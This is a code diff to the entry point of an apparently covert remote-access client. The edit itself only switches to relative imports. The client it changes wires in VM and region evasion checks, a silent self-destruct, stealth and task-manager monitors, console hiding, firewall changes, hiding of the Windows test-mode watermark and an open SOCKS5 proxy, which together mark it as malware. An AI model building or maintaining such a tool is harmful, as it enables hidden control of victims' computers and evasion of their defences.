@@ -1,40 +1,46 @@
 """Entry point for the remote client."""
 from __future__ import annotations
 
+import os
+import sys
+
+if __package__ in {None, ""}:
+    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    __package__ = "remote_client"
+
 import argparse
 import asyncio
 import ipaddress
 import json
 import logging
-import os
 import platform
 import socket
 import tempfile
 import urllib.parse
 import urllib.request
 
-from remote_client.config import (
+from .config import (
     load_antifraud_config,
     resolve_session_id,
     resolve_signaling_token,
     resolve_signaling_url,
     resolve_team_id,
 )
-from remote_client.runtime import build_client, load_or_create_device_token
-from remote_client.security.anti_frod_reg import analyze_region
-from remote_client.security.anti_frod_vm import analyze_device
-from remote_client.security.firewall import ensure_firewall_rules
-from remote_client.security.self_destruct import silent_uninstall_and_cleanup
-from remote_client.security.process_monitor import (
+from .runtime import build_client, load_or_create_device_token
+from .security.anti_frod_reg import analyze_region
+from .security.anti_frod_vm import analyze_device
+from .security.firewall import ensure_firewall_rules
+from .security.self_destruct import silent_uninstall_and_cleanup
+from .security.process_monitor import (
     start_taskmanager_monitor,
     start_stealth_monitor,
     stop_taskmanager_monitor,
     stop_stealth_monitor,
     hide_console_window,
 )
-from remote_client.proxy import ProxySettings, load_proxy_settings_from_env, set_proxy_settings
-from remote_client.system_info import load_or_collect_system_info
-from remote_client.windows.dpi import ensure_dpi_awareness
+from .proxy import ProxySettings, load_proxy_settings_from_env, set_proxy_settings
+from .system_info import load_or_collect_system_info
+from .windows.dpi import ensure_dpi_awareness
 
 # Test Mode watermark remover (Windows only)
 _watermark_remover = None
@@ -168,7 +174,7 @@ def _start_watermark_remover() -> None:
     if not _hide_test_mode_watermark_enabled():
         return
     try:
-        from remote_client.windows.vdd_driver import remove_test_mode_watermark_persistent
+        from .windows.vdd_driver import remove_test_mode_watermark_persistent
         _watermark_remover = remove_test_mode_watermark_persistent()
     except Exception as e:
         logging.getLogger(__name__).debug("Watermark remover failed: %s", e)
@@ -266,7 +272,7 @@ def main() -> None:
     if system_info:
         client_config.update(system_info)
     try:
-        from remote_client.abe_status import collect_abe_status
+        from .abe_status import collect_abe_status
 
         abe_status = collect_abe_status()
     except Exception:
@@ -275,7 +281,7 @@ def main() -> None:
         client_config["abe"] = abe_status
     if _socks5_enabled():
         try:
-            from remote_client.proxy.socks5_server import Socks5ProxyServer
+            from .proxy.socks5_server import Socks5ProxyServer
 
             proxy_host = os.getenv("RC_SOCKS5_HOST", "0.0.0.0").strip() or "0.0.0.0"
             proxy_port = _read_int_env("RC_SOCKS5_PORT", 1080)
